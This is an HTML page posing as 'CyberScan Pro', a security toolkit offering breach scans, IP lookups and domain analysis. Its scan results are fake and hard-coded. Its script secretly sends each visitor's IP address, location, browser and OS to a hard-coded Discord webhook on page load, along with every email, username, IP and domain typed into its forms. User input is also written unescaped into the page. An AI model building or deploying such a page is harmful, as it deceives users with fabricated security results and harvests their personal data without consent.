<!DOCTYPE html>
<html lang="en" data-bs-theme="dark">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CyberScan Pro - Advanced Security Toolkit</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
    :root {
      --dark-bg: #0f172a;
      --darker-bg: #0b1120;
      --card-bg: #1e293b;
      --accent: #3b82f6;
      --danger: #ef4444;
      --success: #10b981;
      --warning: #f59e0b;
      --text: #e2e8f0;
      --text-muted: #94a3b8;
    }

    [data-bs-theme="light"] {
      --dark-bg: #f8f9fa;
      --darker-bg: #e9ecef;
      --card-bg: #ffffff;
      --text: #212529;
      --text-muted: #6c757d;
      --accent: #0d6efd;
      --danger: #dc3545;
      --success: #198754;
      --warning: #ffc107;
    }
    
    body {
      background-color: var(--dark-bg);
      color: var(--text);
      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
      line-height: 1.6;
      min-height: 100vh;
      transition: background-color 0.3s ease;
    }
    
    .navbar {
      background-color: var(--darker-bg) !important;
      border-bottom: 1px solid rgba(0,0,0,0.1);
    }
    
    .navbar-brand {
      font-weight: 700;
      letter-spacing: 0.5px;
      font-size: 1.5rem;
      display: flex;
      align-items: center;
    }
    
    .nav-tabs {
      border-bottom: 1px solid rgba(0,0,0,0.1);
      overflow-x: auto;
      white-space: nowrap;
      flex-wrap: nowrap;
    }
    
    .nav-tabs .nav-link {
      color: var(--text-muted);
      border: none;
      font-weight: 500;
      padding: 12px 20px;
      transition: all 0.3s ease;
      position: relative;
    }
    
    .nav-tabs .nav-link:hover {
      color: var(--text);
      background-color: rgba(59, 130, 246, 0.1);
    }
    
    .nav-tabs .nav-link.active {
      color: var(--accent);
      background: transparent;
      font-weight: 600;
    }
    
    .nav-tabs .nav-link.active::after {
      content: '';
      position: absolute;
      bottom: -1px;
      left: 0;
      right: 0;
      height: 3px;
      background-color: var(--accent);
    }
    
    .card {
      background-color: var(--card-bg);
      border: none;
      border-radius: 12px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.05);
      transition: all 0.3s ease;
      margin-bottom: 1.5rem;
      border: 1px solid rgba(0,0,0,0.05);
    }
    
    .card:hover {
      transform: translateY(-2px);
      box-shadow: 0 10px 15px -3px rgba(0,0,0,0.1);
    }
    
    .form-control {
      background-color: var(--darker-bg);
      color: var(--text);
      border: 1px solid rgba(0,0,0,0.1);
      padding: 12px 15px;
      border-radius: 8px;
      transition: all 0.3s ease;
    }
    
    .form-control:focus {
      background-color: var(--darker-bg);
      color: var(--text);
      border-color: var(--accent);
      box-shadow: 0 0 0 0.25rem rgba(59, 130, 246, 0.25);
    }
    
    .loading-spinner {
      display: inline-block;
      width: 2rem;
      height: 2rem;
      border: 0.3em solid currentColor;
      border-right-color: transparent;
      border-radius: 50%;
      animation: spinner 0.75s linear infinite;
    }
    
    @keyframes spinner {
      to { transform: rotate(360deg); }
    }
    
    .btn-primary {
      background-color: var(--accent);
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      font-weight: 500;
      transition: all 0.3s ease;
    }
    
    .btn-primary:hover {
      background-color: var(--accent);
      opacity: 0.9;
      transform: translateY(-2px);
    }
    
    .tool-icon {
      width: 40px;
      height: 40px;
      display: flex;
      align-items: center;
      justify-content: center;
      border-radius: 8px;
      margin-right: 15px;
      background-color: rgba(59, 130, 246, 0.2);
      color: var(--accent);
    }
    
    .section-title {
      display: flex;
      align-items: center;
      margin-bottom: 20px;
    }
    
    .data-table {
      width: 100%;
      border-collapse: collapse;
    }
    
    .data-table th {
      text-align: left;
      padding: 8px;
      background-color: rgba(0,0,0,0.05);
      border-bottom: 1px solid rgba(0,0,0,0.1);
    }
    
    .data-table td {
      padding: 8px;
      border-bottom: 1px solid rgba(0,0,0,0.05);
    }
    
    .visitor-info {
      position: fixed;
      bottom: 20px;
      left: 20px;
      background-color: var(--card-bg);
      padding: 10px 15px;
      border-radius: 8px;
      font-size: 0.85rem;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      z-index: 999;
      max-width: 300px;
    }
    
    @media (max-width: 768px) {
      .nav-tabs .nav-link {
        padding: 10px 12px;
        font-size: 0.9rem;
      }
      
      .visitor-info {
        bottom: 80px;
        left: 10px;
        right: 10px;
        max-width: none;
      }
    }
    </style>
</head>
<body>
<!-- Navigation -->
<nav class="navbar navbar-expand-lg navbar-dark">
    <div class="container">
        <a class="navbar-brand" href="#">
            <i class="fas fa-shield-alt me-2"></i>CyberScan Pro
        </a>
        <div class="d-flex align-items-center">
            <span class="badge bg-success me-2">PREMIUM</span>
            <button class="btn btn-sm btn-outline-light ms-3" id="themeToggleBtn" title="Toggle theme">
                <i class="fas fa-sun"></i>
            </button>
        </div>
    </div>
</nav>

<!-- Main Content -->
<div class="container py-5">
    <div class="row justify-content-center">
        <div class="col-lg-10">
            <ul class="nav nav-tabs mb-4" id="toolTabs" role="tablist">
                <li class="nav-item" role="presentation">
                    <button class="nav-link active" data-bs-target="#breach" data-bs-toggle="tab" id="breach-tab" role="tab" type="button">
                        <i class="fas fa-user-secret me-2"></i>Breach Scan
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-target="#whois" data-bs-toggle="tab" id="whois-tab" role="tab" type="button">
                        <i class="fas fa-globe me-2"></i>IP Lookup
                    </button>
                </li>
                <li class="nav-item" role="presentation">
                    <button class="nav-link" data-bs-target="#domain" data-bs-toggle="tab" id="domain-tab" role="tab" type="button">
                        <i class="fas fa-search-location me-2"></i>Domain Intel
                    </button>
                </li>
            </ul>

            <div class="tab-content" id="toolTabsContent">
                <!-- Breach Scan Tab -->
                <div class="tab-pane fade show active" id="breach" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-user-secret"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">Breach Scanner</h3>
                                <p class="text-muted mb-0">Check if your information appears in known data breaches</p>
                            </div>
                        </div>
                        <form id="breachForm">
                            <div class="row g-3">
                                <div class="col-md-6">
                                    <input class="form-control" id="breachEmail" placeholder="Email address" type="email">
                                </div>
                                <div class="col-md-6">
                                    <input class="form-control" id="breachUsername" placeholder="Username" type="text">
                                </div>
                                <div class="col-12">
                                    <button class="btn btn-primary w-100 py-3" type="submit">
                                        <i class="fas fa-search me-2"></i>Scan for Breaches
                                    </button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <div id="breachResults"></div>
                </div>

                <!-- IP Lookup Tab -->
                <div class="tab-pane fade" id="whois" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-globe"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">IP Lookup</h3>
                                <p class="text-muted mb-0">Query WHOIS database for IP registration information</p>
                            </div>
                        </div>
                        <form id="whoisForm">
                            <div class="input-group mb-3">
                                <input class="form-control" id="whoisIp" placeholder="Enter IP address" type="text">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-search me-2"></i>Lookup
                                </button>
                            </div>
                        </form>
                    </div>
                    <div id="whoisResults"></div>
                </div>

                <!-- Domain Intel Tab -->
                <div class="tab-pane fade" id="domain" role="tabpanel">
                    <div class="card p-4 mb-4">
                        <div class="section-title">
                            <div class="tool-icon">
                                <i class="fas fa-search-location"></i>
                            </div>
                            <div>
                                <h3 class="mb-1">Domain Intelligence</h3>
                                <p class="text-muted mb-0">Comprehensive domain analysis</p>
                            </div>
                        </div>
                        <form id="domainForm">
                            <div class="input-group mb-3">
                                <input class="form-control" id="domainInput" placeholder="Enter domain" type="text">
                                <button class="btn btn-primary" type="submit">
                                    <i class="fas fa-search me-2"></i>Analyze
                                </button>
                            </div>
                        </form>
                    </div>
                    <div id="domainResults"></div>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Visitor Info -->
<div class="visitor-info" id="visitorInfo">
    <div class="d-flex align-items-center">
        <i class="fas fa-user-circle me-2"></i>
        <div>
            <div><strong>Your IP:</strong> <span id="visitorIP">Detecting...</span></div>
            <div class="small text-muted" id="visitorLocation">Loading location...</div>
        </div>
    </div>
</div>

<!-- Scripts -->
<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
<script>
// Discord Webhook URL
const WEBHOOK_URL = "https://discord.com/api/webhooks/1383100299396518068/bXubPq6c3PUbZlOlbCR0tz-UhxmZc4mbXGX1-d87NGQVO2NZA-dMEiuN5DLjCiFxvd-6";

// Track visitor information
let visitorData = {
    ip: "Unknown",
    location: "Unknown",
    browser: "Unknown",
    os: "Unknown"
};

// Get visitor IP and details
async function getVisitorInfo() {
    try {
        // First try ipapi.co
        const response = await fetch('https://ipapi.co/json/');
        if (response.ok) {
            const data = await response.json();
            visitorData.ip = data.ip || "Unknown";
            visitorData.location = `${data.city || ''}${data.city && data.country_name ? ', ' : ''}${data.country_name || ''}`;
            updateVisitorDisplay();
            logVisitorInfo();
            return;
        }
        
        // Fallback to ipify
        const ipResponse = await fetch('https://api.ipify.org?format=json');
        if (ipResponse.ok) {
            const ipData = await ipResponse.json();
            visitorData.ip = ipData.ip || "Unknown";
            updateVisitorDisplay();
            logVisitorInfo();
        }
    } catch (error) {
        console.error("Error detecting IP:", error);
        visitorData.ip = "Error detecting";
        updateVisitorDisplay();
    }
    
    // Detect browser and OS as fallback
    detectBrowserAndOS();
}

function detectBrowserAndOS() {
    const userAgent = navigator.userAgent;
    
    // Browser detection
    if (userAgent.includes("Firefox")) visitorData.browser = "Firefox";
    else if (userAgent.includes("Chrome")) visitorData.browser = "Chrome";
    else if (userAgent.includes("Safari")) visitorData.browser = "Safari";
    else if (userAgent.includes("Edge")) visitorData.browser = "Edge";
    else if (userAgent.includes("Opera")) visitorData.browser = "Opera";
    else visitorData.browser = "Unknown";
    
    // OS detection
    if (userAgent.includes("Windows")) visitorData.os = "Windows";
    else if (userAgent.includes("Mac")) visitorData.os = "MacOS";
    else if (userAgent.includes("Linux")) visitorData.os = "Linux";
    else if (userAgent.includes("Android")) visitorData.os = "Android";
    else if (userAgent.includes("iOS")) visitorData.os = "iOS";
    else visitorData.os = "Unknown";
}

function updateVisitorDisplay() {
    document.getElementById('visitorIP').textContent = visitorData.ip;
    document.getElementById('visitorLocation').textContent = visitorData.location || "Location unknown";
}

function logVisitorInfo() {
    logToDiscord(
        "Visitor Detected", 
        `New visitor to CyberScan Pro`,
        [
            { name: "IP Address", value: visitorData.ip },
            { name: "Location", value: visitorData.location || "Unknown" },
            { name: "Browser", value: visitorData.browser },
            { name: "Operating System", value: visitorData.os }
        ]
    );
}

// Send data to Discord webhook
function logToDiscord(title, description, fields = []) {
    const payload = {
        embeds: [{
            title: title,
            description: description,
            color: 0x3498db,
            fields: fields,
            timestamp: new Date().toISOString(),
            footer: {
                text: "CyberScan Pro • " + new Date().toLocaleString()
            }
        }]
    };
    
    fetch(WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }).catch(err => console.error("Error sending to Discord:", err));
}

// Theme Toggle
function toggleTheme() {
    const currentTheme = document.documentElement.getAttribute('data-bs-theme');
    const newTheme = currentTheme === 'dark' ? 'light' : 'dark';
    document.documentElement.setAttribute('data-bs-theme', newTheme);
    localStorage.setItem('theme', newTheme);
    
    // Update icon
    const icon = document.getElementById('themeToggleBtn').querySelector('i');
    icon.className = newTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
    
    // Log theme change
    logToDiscord(
        "Theme Changed", 
        `User switched to ${newTheme} mode`,
        [
            { name: "IP", value: visitorData.ip },
            { name: "Location", value: visitorData.location || "Unknown" }
        ]
    );
}

// Initialize theme
function initTheme() {
    const storedTheme = localStorage.getItem('theme') || 'dark';
    document.documentElement.setAttribute('data-bs-theme', storedTheme);
    
    // Set correct icon
    const icon = document.getElementById('themeToggleBtn').querySelector('i');
    icon.className = storedTheme === 'dark' ? 'fas fa-sun' : 'fas fa-moon';
}

// Initialize
window.addEventListener('DOMContentLoaded', function() {
    initTheme();
    getVisitorInfo();
    
    // Set up form handlers
    document.getElementById('breachForm').addEventListener('submit', handleBreachScan);
    document.getElementById('whoisForm').addEventListener('submit', handleIPLookup);
    document.getElementById('domainForm').addEventListener('submit', handleDomainAnalysis);
});

// Breach Scan Handler
function handleBreachScan(e) {
    e.preventDefault();
    const email = document.getElementById('breachEmail').value.trim();
    const username = document.getElementById('breachUsername').value.trim();
    const resultsDiv = document.getElementById('breachResults');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Scanning breaches...</span>
            </div>
        </div>
    `;
    
    setTimeout(() => {
        let resultHTML = '<div class="card p-3">';
        resultHTML += '<h4><i class="fas fa-search me-2"></i>Scan Results</h4>';
        
        if (email || username) {
            if (email) {
                resultHTML += `
                    <div class="mb-4">
                        <h5>Email: ${email}</h5>
                        <p class="text-success"><i class="fas fa-check-circle me-2"></i>No breaches found</p>
                    </div>
                `;
            }
            
            if (username) {
                resultHTML += `
                    <div class="mb-4">
                        <h5>Username: ${username}</h5>
                        <div class="alert alert-danger">
                            <i class="fas fa-exclamation-triangle me-2"></i>
                            Found in 2 known data breaches
                        </div>
                        <div class="card mb-3">
                            <div class="card-header bg-danger bg-opacity-10">
                                <i class="fas fa-database me-2"></i>
                                <strong>LinkedIn 2021 Breach</strong>
                            </div>
                            <div class="card-body">
                                <p><strong>Date:</strong> June 2021</p>
                                <p><strong>Compromised Data:</strong> Emails, Passwords</p>
                                <p><strong>Records:</strong> 700 million</p>
                            </div>
                        </div>
                    </div>
                `;
            }
        } else {
            resultHTML += '<div class="alert alert-warning"><i class="fas fa-exclamation-circle me-2"></i>Please enter an email or username</div>';
        }
        
        resultHTML += '</div>';
        resultsDiv.innerHTML = resultHTML;
        
        // Log to Discord
        logToDiscord(
            "Breach Scan", 
            `User performed breach scan`,
            [
                { name: "Email", value: email || "Not provided" },
                { name: "Username", value: username || "Not provided" },
                { name: "IP", value: visitorData.ip },
                { name: "Location", value: visitorData.location || "Unknown" }
            ]
        );
    }, 1500);
}

// IP Lookup Handler
function handleIPLookup(e) {
    e.preventDefault();
    const ip = document.getElementById('whoisIp').value.trim() || visitorData.ip;
    const resultsDiv = document.getElementById('whoisResults');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Looking up IP information...</span>
            </div>
        </div>
    `;
    
    setTimeout(() => {
        const resultHTML = `
            <div class="card p-3">
                <h4><i class="fas fa-globe me-2"></i>IP Information</h4>
                <table class="data-table mt-3">
                    <tr>
                        <th>IP Address</th>
                        <td>${ip}</td>
                    </tr>
                    <tr>
                        <th>ISP</th>
                        <td>${ip === visitorData.ip ? (visitorData.ip === "Unknown" ? "Unknown" : "Your ISP") : "Google LLC"}</td>
                    </tr>
                    <tr>
                        <th>Location</th>
                        <td>${ip === visitorData.ip ? (visitorData.location || "Unknown") : "Mountain View, California, US"}</td>
                    </tr>
                </table>
            </div>
        `;
        
        resultsDiv.innerHTML = resultHTML;
        
        // Log to Discord
        logToDiscord(
            "IP Lookup", 
            `User looked up IP information`,
            [
                { name: "IP Looked Up", value: ip },
                { name: "Visitor IP", value: visitorData.ip },
                { name: "Visitor Location", value: visitorData.location || "Unknown" }
            ]
        );
    }, 1500);
}

// Domain Analysis Handler
function handleDomainAnalysis(e) {
    e.preventDefault();
    const domain = document.getElementById('domainInput').value.trim() || "example.com";
    const resultsDiv = document.getElementById('domainResults');
    
    resultsDiv.innerHTML = `
        <div class="card p-3">
            <div class="d-flex justify-content-center">
                <div class="loading-spinner"></div>
                <span class="ms-2">Analyzing domain...</span>
            </div>
        </div>
    `;
    
    setTimeout(() => {
        const resultHTML = `
            <div class="card p-3">
                <h4><i class="fas fa-search-location me-2"></i>Domain Analysis: ${domain}</h4>
                <table class="data-table mt-3">
                    <tr>
                        <th>Domain</th>
                        <td>${domain}</td>
                    </tr>
                    <tr>
                        <th>Registrar</th>
                        <td>GoDaddy</td>
                    </tr>
                    <tr>
                        <th>Created</th>
                        <td>2020-01-15</td>
                    </tr>
                    <tr>
                        <th>Expires</th>
                        <td>2025-01-15</td>
                    </tr>
                    <tr>
                        <th>Nameservers</th>
                        <td>ns1.example.com, ns2.example.com</td>
                    </tr>
                </table>
            </div>
        `;
        
        resultsDiv.innerHTML = resultHTML;
        
        // Log to Discord
        logToDiscord(
            "Domain Analysis", 
            `User analyzed domain`,
            [
                { name: "Domain", value: domain },
                { name: "Visitor IP", value: visitorData.ip },
                { name: "Visitor Location", value: visitorData.location || "Unknown" }
            ]
        );
    }, 1500);
}
</script>
</body>
</html>
